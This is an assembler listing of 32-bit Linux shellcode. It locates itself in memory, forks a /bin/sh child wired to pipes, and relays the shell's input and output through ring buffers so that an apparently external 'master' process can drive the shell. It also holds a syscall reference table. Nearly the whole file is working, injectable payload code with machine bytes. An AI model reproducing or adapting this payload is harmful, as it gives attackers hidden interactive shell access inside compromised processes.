     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  ;
     8                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
     9                                  ;
    10                                  ; all necessary system calls:
    11                                  ; ===========================
    12                                  ;
    13                                  ; clone:	eax: 120
    14                                  ; 		ebx: clone-flags
    15                                  ; 		ecx: ptr to top of (distinct) stack space
    16                                  ; 		edx: ptr to pt_regs or NULL
    17                                  ;
    18                                  ; close:	eax: 6
    19                                  ; 		ebx: fd to close
    20                                  ;
    21                                  ; dup2:	eax: 63
    22                                  ; 		ebx: fd 2 dup
    23                                  ; 		ecx: fd to assign the dup to
    24                                  ;
    25                                  ; execve:	eax: 11
    26                                  ; 		ebx: ptr to string of program path&name
    27                                  ; 		ecx: ptr to argv[]
    28                                  ; 		edx: ptr to envv[]
    29                                  ;
    30                                  ; exit:	eax: 1
    31                                  ; 		ebx: exit code
    32                                  ;
    33                                  ; fcntl:	eax: 55
    34                                  ; 		ebx: fd
    35                                  ; 		ecx: command code
    36                                  ; 		edx: file locks: ptr to writable struct flock
    37                                  ;
    38                                  ; fork:	eax: 2
    39                                  ; 		ebx... are passed to forked process.
    40                                  ;
    41                                  ; kill:	eax: 37
    42                                  ; 		ebx: pid (?)
    43                                  ; 		ecx: signal (?)
    44                                  ; 		SIGKILL = 9
    45                                  ;
    46                                  ; nanosleep:	eax: 162
    47                                  ; 		ebx: ptr to struct timespec
    48                                  ; 		ecx: ptr to alterable struct timespec
    49                                  ;
    50                                  ; read:	eax: 3
    51                                  ; 		ebx: fd
    52                                  ; 		ecx: ptr to buffer
    53                                  ; 		edx: count
    54                                  ;
    55                                  ; write:	eax: 4
    56                                  ; 		ebx: fd
    57                                  ; 		ecx: ptr to buffer
    58                                  ; 		edx: count
    59                                  ;
    60                                  ; pipe:	eax: 42
    61                                  ; 		ebx: ptr to dword[2]
    62                                  ;
    63                                  
    64                                  start:
    65 00000000 E800000000              	call near shcode_start
    66                                  shcode_start:
    67 00000005 5D                      	pop	ebp
    68 00000006 81C515020000            	add	ebp, data_start - shcode_start
    69                                  
    70                                  	; pipe(m2sh)
    71 0000000C 31C0                    	xor	eax,eax
    72 0000000E B02A                    	mov	al,42
    73 00000010 89EB                    	mov	ebx,ebp
    74 00000012 81C316000000            	add	ebx,m2sh_0
    75 00000018 CD80                    	int	0x80
    76                                  
    77 0000001A 3D00000000              	cmp	eax,0
    78 0000001F 7524                    	jne	child_dead_interleaved
    79                                  
    80                                  	; pipe(sh2m)
    81 00000021 31C0                    	xor	eax,eax
    82 00000023 B02A                    	mov	al,42
    83 00000025 89EB                    	mov	ebx,ebp
    84 00000027 81C31E000000            	add	ebx,sh2m_0
    85 0000002D CD80                    	int	0x80
    86                                  
    87 0000002F 3D00000000              	cmp	eax,0
    88 00000034 750F                    	jne	child_dead_interleaved
    89                                  
    90                                  	; fork()
    91 00000036 31C0                    	xor	eax,eax
    92 00000038 B002                    	mov	al,2
    93 0000003A CD80                    	int	0x80
    94                                  
    95 0000003C 3D00000000              	cmp	eax,0
    96 00000041 7407                    	je	child
    97 00000043 7F5D                    	jg	parent			; signed compare
    98                                  child_dead_interleaved:
    99 00000045 E998010000              	jmp	child_dead
   100                                  
   101                                  child:
   102                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   103 0000004A 31C0                    	xor	eax,eax
   104 0000004C B03F                    	mov	al,63
   105 0000004E 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   106 00000054 31C9                    	xor	ecx,ecx
   107 00000056 CD80                    	int	0x80
   108                                  
   109 00000058 39C8                    	cmp	eax,ecx
   110 0000005A 7541                    	jne	leave_sh_interleaved
   111                                  
   112                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   113 0000005C 31C0                    	xor	eax,eax
   114 0000005E B03F                    	mov	al,63
   115 00000060 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   116 00000066 41                      	inc	ecx
   117 00000067 CD80                    	int	0x80
   118                                  
   119 00000069 39C8                    	cmp	eax,ecx
   120 0000006B 7530                    	jne	leave_sh_interleaved
   121                                  	
   122                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   123 0000006D 31C0                    	xor	eax,eax
   124 0000006F B03F                    	mov	al,63
   125                                  ;	mov	ebx,[ebp+sh2m_1]
   126 00000071 41                      	inc	ecx
   127 00000072 CD80                    	int	0x80
   128                                  
   129 00000074 39C8                    	cmp	eax,ecx
   130 00000076 7525                    	jne	leave_sh_interleaved
   131                                  
   132                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   133 00000078 31C0                    	xor	eax,eax
   134 0000007A B00B                    	mov	al,11
   135 0000007C 89EB                    	mov	ebx,ebp
   136 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   137                                  
   138 00000084 89E9                    	mov	ecx,ebp
   139 00000086 81C126020000            	add	ecx,foo				; ecx -> foo
   140                                  
   141 0000008C 31D2                    	xor	edx,edx
   142 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   143 00000090 895104                  	mov	[ecx+4],edx			; bar := NULL
   144 00000093 89CA                    	mov	edx,ecx
   145 00000095 81C204000000            	add	edx,4				; edx -> bar
   146 0000009B CD80                    	int	0x80
   147                                  
   148                                  	; fail if execve did not work.
   149                                  leave_sh_interleaved:
   150 0000009D E971010000              	jmp	leave_sh
   151                                  
   152                                  parent:
   153                                  	; remember child's PID
   154 000000A2 898512000000            	mov	[ebp+child_pid],eax
   155                                  
   156                                  	; close(m2sh[0])
   157 000000A8 31C0                    	xor	eax,eax
   158 000000AA B006                    	mov	al,6
   159 000000AC 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   160 000000B2 CD80                    	int	0x80
   161                                  
   162                                  	; close(sh2m[1])
   163 000000B4 31C0                    	xor	eax,eax
   164 000000B6 B006                    	mov	al,6
   165 000000B8 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   166 000000BE CD80                    	int	0x80
   167                                  
   168                                  	; clone:
   169                                  	; one thread for reader, one thread for writer
   170 000000C0 31C0                    	xor	eax,eax
   171 000000C2 B078                    	mov	al,120
   172                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   173                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   174                                  	; CLONE_PTRACE = 0x00002000
   175 000000C4 BB000F0100              	mov	ebx,0x00010f00
   176 000000C9 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   177 000000CB 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   178 000000D1 31D2                    	xor	edx,edx
   179 000000D3 CD80                    	int	0x80
   180                                  
   181 000000D5 3D00000000              	cmp	eax,0
   182                                  	; ret=0 -> clone
   183 000000DA 7407                    	je	thread_write_to_master_interleaved	; clone is writer
   184                                  	; ret>0 -> original
   185 000000DC 7F0A                    	jg	thread_read_from_master			; original is reader
   186                                  	; error if ret<0
   187 000000DE E9FF000000              	jmp	child_dead
   188                                  
   189                                  thread_write_to_master_interleaved:
   190 000000E3 E98D000000              	jmp	thread_write_to_master
   191                                  
   192                                  	; ==================================== the READER thread:
   193                                  thread_read_from_master:
   194                                  	; will write to child via m2sh[1]
   195                                  	; remember RINGBUFFER from_master in esi
   196 000000E8 89EE                    	mov	esi,ebp
   197 000000EA 81C626000000            	add	esi,rfrm_buffer
   198                                  
   199                                  reader_while_fds_ok:
   200                                  	; while both FDs are ok:
   201 000000F0 8A8503000000            	mov	al,[ebp+to_child_ok]
   202 000000F6 028504000000            	add	al,[ebp+from_child_ok]
   203 000000FC 3C02                    	cmp	al,2
   204 000000FE 7546                    	jne	leave_sh_second_interleaved
   205                                  
   206                                  	; test, if master requested child to be terminated
   207 00000100 8A8502000000            	mov	al,[ebp+terminate_child]
   208 00000106 3C00                    	cmp	al,0
   209 00000108 7548                    	jne	do_terminate_child
   210                                  
   211                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   212 0000010A 31C0                    	xor	eax,eax
   213 0000010C 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   214 00000112 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   215 00000118 7431                    	jz	reader_sleep
   216                                  
   217                                  	; write a chunk to the child.
   218                                  	; EAX/AL is the number of bytes to be written to the child.
   219 0000011A 31DB                    	xor	ebx,ebx
   220 0000011C 8A9D06000000            	mov	bl,[ebp+rfrm_reader_pos]
   221 00000122 89D9                    	mov	ecx,ebx
   222 00000124 00C1                    	add	cl,al
   223 00000126 38D9                    	cmp	cl,bl
   224 00000128 7704                    	ja	reader_no_overlap	; writer is behind reader. no overlap
   225                                  
   226 0000012A 31C0                    	xor	eax,eax
   227 0000012C 28C8                    	sub	al,cl			; number of bytes to end of buffer.
   228                                  
   229                                  reader_no_overlap:
   230                                  	; write the data from the ringbuffer to the child
   231 0000012E 89C2                    	mov	edx,eax
   232 00000130 31C0                    	xor	eax,eax
   233 00000132 B004                    	mov	al,4
   234 00000134 01F3                    	add	ebx,esi		; EBX points to position in buffer where the to-be-written data resides
   235 00000136 8B8D1A000000            	mov	ecx,[ebp+m2sh_1]
   236 0000013C CD80                    	int	0x80
   237                                  
   238                                  	; mark chunk as read
   239 0000013E 009506000000            	add	[ebp+rfrm_reader_pos], dl
   240 00000144 EBAA                    	jmp	reader_while_fds_ok
   241                                  
   242                                  leave_sh_second_interleaved:
   243 00000146 E9C8000000              	jmp	leave_sh
   244                                  
   245                                  reader_sleep:
   246 0000014B E875000000              	call	sleep_short
   247 00000150 EB9E                    	jmp	reader_while_fds_ok
   248                                  
   249                                  do_terminate_child:
   250                                  	; send a SIGKILL to child
   251 00000152 31C0                    	xor	eax,eax
   252 00000154 B025                    	mov	al,37
   253 00000156 8B9D12000000            	mov	ebx,[ebp+child_pid]
   254 0000015C 31C9                    	xor	ecx,ecx
   255 0000015E B109                    	mov	cl,9	; SIGKILL
   256 00000160 CD80                    	int	0x80
   257                                  
   258                                  	; clear to_child_ok
   259 00000162 31C0                    	xor	eax,eax
   260 00000164 898503000000            	mov	[ebp+to_child_ok], eax
   261                                  	; and from_child_ok
   262 0000016A 898504000000            	mov	[ebp+from_child_ok], eax
   263 00000170 E99E000000              	jmp	leave_sh
   264                                  
   265                                  	; ==================================== the WRITER thread:
   266                                  thread_write_to_master:
   267                                  	; will read from child via sh2m[0]
   268                                  	; remember RINGBUFFER to_master in esi
   269 00000175 89EE                    	mov	esi,ebp
   270 00000177 81C626010000            	add	esi,rto_buffer
   271                                  
   272                                  writer_while_fds_ok:
   273                                  	; while both FDs are ok:
   274 0000017D 8A8503000000            	mov	al,[ebp+to_child_ok]
   275 00000183 028504000000            	add	al,[ebp+from_child_ok]
   276 00000189 3C02                    	cmp	al,2
   277 0000018B 7555                    	jne	child_dead
   278                                  
   279                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   280 0000018D 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   281 00000193 FEC0                    	inc	al
   282 00000195 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   283 0000019B 7421                    	jz	writer_sleep
   284                                  
   285                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   286 0000019D 31C0                    	xor	eax,eax
   287 0000019F B003                    	mov	al,3
   288 000001A1 8B9D1E000000            	mov	ebx,[ebp+sh2m_0]
   289 000001A7 31C9                    	xor	ecx,ecx
   290 000001A9 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   291 000001AF 01F1                    	add	ecx,esi
   292 000001B1 31D2                    	xor	edx,edx
   293 000001B3 42                      	inc	edx
   294 000001B4 CD80                    	int	0x80
   295                                  
   296 000001B6 FE8507000000            	inc byte [ebp+rto_writer_pos]
   297                                  
   298                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   299                                  	; read() will block if there is no data from child.
   300 000001BC EBBF                    	jmp	writer_while_fds_ok
   301                                  
   302                                  writer_sleep:
   303 000001BE E802000000              	call	sleep_short
   304 000001C3 EBB8                    	jmp	writer_while_fds_ok
   305                                  
   306                                  	; ==================================================================
   307                                  
   308                                  sleep_short:
   309                                  	; sleep 0.001 seconds:
   310                                  	; usleep(0,1000000);
   311 000001C5 31C0                    	xor	eax,eax
   312 000001C7 B0A2                    	mov	al, 162
   313 000001C9 89EB                    	mov	ebx, ebp
   314 000001CB 81C326020000            	add	ebx, foo
   315 000001D1 89D9                    	mov	ecx, ebx
   316 000001D3 31D2                    	xor	edx,edx
   317 000001D5 8913                    	mov long [ebx], edx		; seconds
   318 000001D7 BAA0860100              	mov	edx,100000
   319 000001DC 895304                  	mov long [ebx+4], edx		; nanoseconds
   320 000001DF CD80                    	int	0x80
   321                                  
   322 000001E1 C3                      	ret
   323                                  
   324                                  child_dead:
   325                                  	; at most wait 2 seconds for master's ACK
   326 000001E2 31C0                    	xor	eax,eax
   327 000001E4 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   328 000001EA 7527                    	jne	leave_sh
   329 000001EC B002                    	mov	al,2
   330 000001EE 388500000000            	cmp	[ebp+child_is_dead], al
   331 000001F4 771D                    	ja	leave_sh
   332                                  
   333 000001F6 FE4500                  	inc byte [ebp]
   334                                  
   335                                  	; usleep(1,0):
   336 000001F9 31C0                    	xor	eax,eax
   337 000001FB B0A2                    	mov	al, 162
   338 000001FD 89EB                    	mov	ebx, ebp
   339 000001FF 81C326020000            	add	ebx, foo
   340 00000205 89D9                    	mov	ecx, ebx
   341 00000207 31D2                    	xor	edx,edx
   342 00000209 895304                  	mov long [ebx+4], edx		; nanoseconds
   343 0000020C 42                      	inc	edx
   344 0000020D 8913                    	mov long [ebx], edx		; seconds
   345 0000020F CD80                    	int	0x80
   346                                  
   347 00000211 EBCF                    	jmp	child_dead
   348                                  
   349                                  leave_sh:
   350                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   351 00000213 31C0                    	xor	eax,eax
   352 00000215 89C3                    	mov	ebx,eax
   353 00000217 40                      	inc	eax
   354 00000218 CD80                    	int	0x80
   355                                  
   356                                  ; =============================================================================
   357                                  ; DATA
   358                                  data_start EQU $
   359                                  
   360                                  ; do not change order of the following stuff!
   361                                  
   362                                  child_is_dead EQU $ - data_start
   363 0000021A 00                      	db		0
   364                                  child_is_dead_ACK EQU $ - data_start
   365 0000021B 00                      	db		0
   366                                  
   367                                  terminate_child	EQU $ - data_start
   368 0000021C 00                      	db		0
   369                                  
   370                                  to_child_ok EQU $ - data_start
   371 0000021D 01                      	db		1
   372                                  from_child_ok EQU $ - data_start
   373 0000021E 01                      	db		1
   374                                  
   375                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   376                                  ; a ringbuffer is FULL, if _reader == _writer+1
   377                                  
   378                                  ; ringbuffer from_master:
   379                                  
   380                                  rfrm_writer_pos EQU $ - data_start
   381 0000021F 00                      	db		0
   382                                  rfrm_reader_pos EQU $ - data_start
   383 00000220 00                      	db		0
   384                                  
   385                                  ; ringbuffer to_master:
   386                                  
   387                                  rto_writer_pos EQU $ - data_start
   388 00000221 00                      	db		0
   389                                  rto_reader_pos EQU $ - data_start
   390 00000222 00                      	db		0
   391                                  
   392                                  execve_command EQU $ - data_start
   393 00000223 2F62696E2F736800        	db	'/bin/sh',0
   394                                  
   395                                  ; =============================================================================
   396                                  ; stuff that is not required to be initialized:
   397 0000022B 90                      align 4
   398                                  
   399                                  child_pid EQU $ - data_start
   400                                  
   401                                  ; pipes middleman<->shell
   402                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   403                                  m2sh_1 EQU $ - data_start + 8			; master writes
   404                                  sh2m_0 EQU $ - data_start + 12			; master reads
   405                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   406                                  
   407                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   408                                  rto_buffer EQU $ - data_start + 276		; TO master
   409                                  
   410                                  foo EQU $ - data_start + 532
   411                                  bar EQU $ - data_start + 536
   412                                  baz EQU $ - data_start + 540
   413                                  qux EQU $ - data_start + 544
   414                                  
